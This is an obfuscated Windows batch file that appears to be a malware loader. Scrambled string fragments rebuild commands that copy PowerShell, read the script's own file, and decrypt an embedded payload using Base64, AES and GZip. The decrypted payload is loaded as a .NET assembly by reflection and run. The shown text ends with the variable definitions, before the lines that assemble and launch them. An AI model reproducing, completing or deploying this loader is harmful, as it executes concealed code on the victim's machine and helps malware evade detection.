@echo off
set "lAaoPUtVgx=0\"
set "csvBBleLgG=po"
set "oJweUZzBAl=he"
set "kJKiQAPQrF=rS"
set "NNeRXDSzEj=ow"
set "fyZzoFhsmZ=he"
set "zPlVfQoVVd=s\"
set "IeEggDnkXW=.e"
set "ZFQpHAmorZ=we"
set "rUdbxccXtk=1."
set "ramIsqjMvI=xe"
set "UTKKggKXsD=do"
set "oQKfJUkETN=py"
set "mDXurVHcMl=\W"
set "rpLsxhLuHD=Po"
set "shnDEnqoCj=Sy"
set "AfcPzYsxDS=em"
set "AbxHPtSnok=we"
set "qzekDETeyy=rs"
set "QKYkBAuvsX=:\"
set "qyNVwXOnCs= C"
set "PvLKgBaGjO=co"
set "UixkPjepXr=y "
set "XrQNkGJLHo=ll"
set "bLOfcZJraX= /"
set "SEhjjUvsUv=st"
set "HAkSZtEGZY=Wi"
set "vpqOctxxvP=ll"
set "eUtntHFCBX=\v"
set "dLUkQGzBnK=32"
set "uUfkjXhHyE=ws"
set "ODtJIrHQnj=nd"
set "uVaACnfxdF=in"
set "hlcBQgoZlt=cd"
set "ZdzeqegZpG= %~dp0"
set "xEbyXNBqRb=bstr"
set "BFhuwqIcSZ=.Ass"
set "pdMKcKBukh=Disp"
set "GJckynuxdj=[Sys"
set "ZFvPaQijhJ=]::("
set "fkivwcoABW=v, 0"
set "fPaCRNxGfY=n ''"
set "nDGXppaSpP=m.Re"
set "TaZzvGXmpZ=ion."
set "TAxsJcDtPA=r = "
set "fHcnFrJyIB=ddin"
set "ERtkgyprlx=rtS4"
set "pwSYPvaQUy=Conv"
set "RolmaAiWZl=[Sys"
set "LUwiRTPToz=y.Pa"
set "vAHfWikLYw=s) {"
set "hlzUXljRVn=New-"
set "WEGlsWIIuG=rt]:"
set "GDBnzOubAD=[]] "
set "TJckwmkMoX=ew-O"
set "DuxffPMHuw=, (,"
set "XHybEPpUWU='gni"
set "anZEbxblfX=File"
set "ddfktlYbiL=('%~f0'"
set "pDRtUQcyzm=v4Ir"
set "IiZVVdMXBh=;$lA"
set "MUJfPoqKFz=yste"
set "nVZshmcpFt=ay()"
set "tdKECkkqiK=tion"
set "APFCKEtlYh=YXuk"
set "KvTLegVUwj=::De"
set "WRYkqInvSI=[Sys"
set "vTfcxujIrY=hy.A"
set "nEDEjIERPW=tS46"
set "sGZKcsQGTy=join"
set "ugnSOBmQGl=iG.I"
set "pwmKQkYanE= if "
set "iYHTtLRebu=sv);"
set "gbzEeKieXw=lBlo"
set "jShGtdRkqs=ke($"
set "wciBFMMlkF=..-1"
set "yAbdLdiQXC=Gn.D"
set "uZJEiZXWou=kr, "
set "cPXAPrAose=in $"
set "aiMZRUKyPq='dqR"
set "vBpKHjjHYT=m.IO"
set "MryiqLNJGD=]::C"
set "HDJAKTlKyW=-nop"
set "IVVJCRrkpx=Stre"
set "JHtSEEzgOw=grap"
set "ifgXfznAac=..-1"
set "fSkMIhEQTL=tryP"
set "otwKLLzsHh=O.Me"
set "SMtHgquZTy=rity"
set "BLBBRDcxZf=Fina"
set "xyyoWYMYrF=yste"
set "aOvspJFgfh=HPTr"
set "tgfYiiGYKs= [st"
set "UcHhYVjJKt=lit("
set "WyPTHfDogk=$Vfg"
set "xuqbFwLcUF=0O+g"
set "pzSoThTszM=stem"
set "oHhOfkVjKq=yTo("
set "pgWglhHogO=em.C"
set "DQTAuyVcfp== $x"
set "eCNnUgKfpV=e = "
set "XWsUWhBcNM=-joi"
set "nAhQtzTPoA= '')"
set "jhAsOCtaye=Fo7l"
set "TXnImCgfYx=m.IO"
set "uCOUrtyNiT=n = "
set "FfvuYVAYjM=.-16"
set "emwcubWdsZ=ing("
set "NaZGBJYReg=embl"
set "gOpWPDCLBf=Star"
set "tpcjHcFQyw=New-"
set "sirZNEEWXI= New"
set "mNpVDCIEzb= = ["
set "cFyjNcfMSa=bjec"
set "CuNEXsPiay=yste"
set "mOtDMIujDT=.Key"
set "yTRxpbgcWb=isfL"
set "KCPeQZvjNi=zz ="
set "qrPqjZmkZb=OyzA"
set "yTwVzRgDca=flec"
set "sEMmNDxVji=)($a"
set "QDOBfQuSAG=F.Su"
set "DtlWgjtDku=onve"
set "dFvTlpHkIC=d;$x"
set "alZYFPQMLe=UwF "
set "awXcXZWBmP=t Sy"
set "ZWAdWRvMEw=($ll"
set "iHFCNCHSHf=RuiG"
set "PUsifymjRy=PKCS"
set "dPyVwrxTMA= = N"
set "ToZhpNSovZ== [S"
set "gcWsnZJAuV=$xRu"
set "HQostzUmAh=raph"
set "zBAOLGJkcU=oArr"
set "aNFevVWOed=nwZ."
set "mslczpzhpm=-1.."
set "NlGVvlAhBE=rs ="
set "qbSDKjqORq=ress"
set "eXBdgFktKc= '')"
set "EQjwICmzkD==');"
set "Zcreypoqjs=UGTu"
set "RVDWZovvXD=RuiG"
set "zJlpQKexrg=Xvr."
set "CmQrtrUyvV=m(, "
set "NJAdaNLQfY=gth)"
